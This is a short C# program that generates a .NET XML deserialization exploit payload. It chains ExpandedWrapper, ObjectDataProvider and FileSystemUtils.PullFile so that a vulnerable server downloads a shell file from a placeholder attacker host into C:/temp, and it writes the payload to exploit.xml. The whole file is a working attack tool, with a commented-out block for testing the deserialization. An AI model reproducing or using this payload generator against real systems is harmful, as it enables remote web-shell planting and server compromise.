using System;
using System.IO;
using System.Windows.Data;
using System.Collections;
using System.Data.Services.Internal;

namespace ODPSerializer
{
    class Program
    {
        static void Main(string[] args)
        {

/*
		// Test Deserialization
            string xmlSource = System.IO.File.ReadAllText("C:\\Users\\Public\\exploit.xml");
            Globals.DeserializeHashTableXml(xmlSource);
            return;
*/
            ExpandedWrapper<FileSystemUtils, ObjectDataProvider> myExpWrap = new ExpandedWrapper<FileSystemUtils, ObjectDataProvider>();
            myExpWrap.ProjectedProperty0 = new ObjectDataProvider();
            myExpWrap.ProjectedProperty0.ObjectInstance = new FileSystemUtils();
            myExpWrap.ProjectedProperty0.MethodName = "PullFile";
            myExpWrap.ProjectedProperty0.MethodParameters.Add("http://<attacker_host>/<myshell.whatever>");
            myExpWrap.ProjectedProperty0.MethodParameters.Add("C:/temp/<myshell.whatever>");

            Hashtable table = new Hashtable();
            table["myTableEntry"] = myExpWrap;
            String payload = XmlUtils.SerializeDictionary(table, "profile");
            TextWriter writer = new StreamWriter("C:\\Users\\Public\\exploit.xml");
            writer.Write(payload);
            writer.Close();


            Console.WriteLine("Done!");
        }
    }
}
